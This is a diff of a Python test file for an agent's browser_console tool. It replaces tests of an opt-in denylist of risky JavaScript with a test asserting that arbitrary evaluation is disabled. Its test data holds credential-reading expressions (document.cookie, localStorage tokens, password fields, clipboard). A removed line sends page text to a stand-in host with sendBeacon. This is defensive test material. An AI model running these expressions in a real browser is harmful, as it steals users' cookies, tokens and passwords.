@@ -16,6 +16,12 @@ sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
 class TestBrowserConsole:
     """browser_console() returns console messages + JS errors in one call."""
 
+    @pytest.fixture(autouse=True)
+    def _retired_eval_does_not_probe_page_url(self, monkeypatch):
+        """Console-only tests do not need the retired eval URL probe."""
+        monkeypatch.setattr("tools.browser_tool._last_session_key", lambda task_id: task_id)
+        monkeypatch.setattr("tools.browser_tool._blocked_private_page_content", lambda _task_id: None)
+
     def test_returns_console_messages_and_errors(self):
         from tools.browser_tool import browser_console
 
@@ -86,90 +92,23 @@ class TestBrowserConsole:
         assert fake_key not in redacted_text
         assert "***" in redacted_text or "..." in redacted_text
 
-    def test_redacts_secrets_from_eval_result(self):
-        from tools.browser_tool import _browser_eval
-
-        fake_key = "ghp_" + "BROWSEREVALSECRET1234567890"
-        with patch("tools.browser_tool._last_session_key", return_value="test"), \
-             patch("tools.browser_tool._is_camofox_mode", return_value=False), \
-             patch("tools.browser_tool_session._run_browser_command", return_value={"success": True, "data": {"result": fake_key}}):
-            result = json.loads(_browser_eval("document.body.innerText", task_id="test"))
-
-        assert result["success"] is True
-        assert "BROWSEREVALSECRET" not in json.dumps(result)
-        assert result["result"].startswith("ghp_")
-
-
-    def test_expression_allows_risky_eval_by_default(self):
-        """The sensitive-primitive denylist is opt-in — default config runs everything.
-
-        The names-based denylist blocked legitimate DOM extraction (any selector
-        or expression containing 'fetch'/'cookie'/'input' etc.), so it is off
-        unless browser.restrict_evaluate is set. Egress to private addresses is
-        still guarded separately in _browser_eval.
-        """
+    def test_expression_is_disabled_before_eval(self):
         from tools.browser_tool import browser_console
 
         expressions = [
+            "document.title",
             "document.cookie",
             "fetch('/api/me')",
             "localStorage.getItem('token')",
             "document.querySelector('input[type=password]').value",
-            "document.querySelector('#fetch-results').innerText",
         ]
-        with patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": "ok"})) as mock_eval:
-            for expr in expressions:
-                result = json.loads(browser_console(expression=expr, task_id="test"))
-                assert result == {"success": True, "result": "ok"}, expr
-
-        assert mock_eval.call_count == len(expressions)
-
-    def test_expression_blocks_cookie_access_before_eval(self):
-        from tools.browser_tool import browser_console
-
-        with patch("tools.browser_tool_eval_policy._restrict_browser_evaluate", return_value=True), \
-             patch("tools.browser_tool_eval_policy._allow_unsafe_browser_evaluate", return_value=False), \
-             patch("tools.browser_tool._browser_eval") as mock_eval:
-            result = json.loads(browser_console(expression="document.cookie", task_id="test"))
-
-        assert result["success"] is False
-        assert "Blocked" in result["error"]
-        assert "document.cookie" in result["error"]
-        mock_eval.assert_not_called()
-
-    def test_expression_blocks_storage_and_network_access_before_eval(self):
-        from tools.browser_tool import browser_console
-
-        risky_expressions = [
-            "localStorage.getItem('token')",
-            "sessionStorage.token",
-            "indexedDB.databases()",
-            "navigator.clipboard.readText()",
-            "fetch('/api/me')",
-            "navigator.sendBeacon('https://evil.test', document.body.innerText)",
-            "document.querySelector('input[type=password]').value",
-        ]
-        with patch("tools.browser_tool_eval_policy._restrict_browser_evaluate", return_value=True), \
-             patch("tools.browser_tool_eval_policy._allow_unsafe_browser_evaluate", return_value=False), \
-             patch("tools.browser_tool._browser_eval") as mock_eval:
-            for expr in risky_expressions:
-                result = json.loads(browser_console(expression=expr, task_id="test"))
-                assert result["success"] is False, expr
-                assert "Blocked" in result["error"], expr
+        with patch("tools.browser_tool._browser_eval") as mock_eval:
+            for expression in expressions:
+                result = json.loads(browser_console(expression=expression, task_id="test"))
+                assert result["success"] is False, expression
+                assert "arbitrary browser JavaScript evaluation is unavailable" in result["error"], expression
 
         mock_eval.assert_not_called()
-
-
-    def test_restrict_evaluate_reads_browser_config(self):
-        from tools.browser_tool_eval_policy import _restrict_browser_evaluate
-
-        with patch("hermes_cli.config.read_raw_config", return_value={"browser": {"restrict_evaluate": "true"}}):
-            assert _restrict_browser_evaluate() is True
-        with patch("hermes_cli.config.read_raw_config", return_value={"browser": {"restrict_evaluate": False}}):
-            assert _restrict_browser_evaluate() is False
-        # Default (key absent) is off — the denylist is opt-in.
-        with patch("hermes_cli.config.read_raw_config", return_value={}):
-            assert _restrict_browser_evaluate() is False
 
 
 # ── browser_console schema ───────────────────────────────────────────
